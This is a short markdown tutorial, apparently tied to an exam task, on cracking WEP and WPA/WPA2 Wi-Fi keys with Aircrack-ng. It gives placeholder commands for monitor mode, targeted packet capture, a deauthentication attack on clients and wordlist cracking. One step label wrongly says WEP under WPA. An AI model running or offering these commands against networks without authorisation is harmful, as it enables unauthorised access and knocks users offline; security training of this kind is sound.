# Aircrack-ng Basic Use Case

Aircrack-ng is a network software suite that includes tools for monitoring, attacking, testing, and cracking Wi-Fi networks. Below is a basic use case for cracking a WEP key using aircrack-ng.

## Steps to Crack a WEP Key

1. **Capture Data Packets**: Use `airodump-ng` to capture data packets from the target network.
2. **Crack the WEP Key**: Use `aircrack-ng` to crack the WEP key from the captured data packets.

## Example Commands

### WEP
1. **Put the Wireless Interface in Monitor Mode:**
   ```sh
   sudo airmon-ng start wlan0
   
2. **Capture Data Packets:**
    ```sh
   sudo airodump-ng -c [channel] --bssid [AP MAC] -w [output file] wlan0mon
     ```
   * -c [channel]: Channel of the target network.
   * --bssid [AP MAC]: MAC address of the target Access Point.
   * -w [output file]: File to save the captured packets.
3. **Crack the WEP Key:**
    ```sh
   sudo aircrack-ng -b [AP MAC] [output file].cap
    ```
   * -b [AP MAC]: MAC address of the target Access Point.
   * [output file].cap: File containing the captured packets.

### WPA/WPA2
1. **Put the Wireless Interface in Monitor Mode:**
   ```sh
   sudo airmon-ng start wlan0

2. **Capture Data Packets:**
    ```sh
   sudo airodump-ng -c [channel] --bssid [AP MAC] -w [output file] wlan0mon
     ```
    * -c [channel]: Channel of the target network.
    * --bssid [AP MAC]: MAC address of the target Access Point.
    * -w [output file]: File to save the captured packets.
3. **Deauthenticate a Client:**
    ```sh
   sudo aireplay-ng --deauth 10 -a [AP MAC] -c [client MAC] wlan0mon
    ```
    * -a [AP MAC]: MAC address of the target Access Point.
    * -c [client MAC]: MAC address of the client device.
4. **Crack the WEP Key:**
    ```sh
   sudo aircrack-ng -w [wordlist] -b [AP MAC] [output file].cap
    ```
    * -w [wordlist]: Path to the wordlist file.
    * -b [AP MAC]: MAC address of the target Access Point.
    * [output file].cap: File containing the captured packets.


# Aufgabe

I got to know about this after I locked my answer and finished the exam. I asked this from one of my friend. I was asked to crack the wireless encryption and identify the Wi-Fi password.


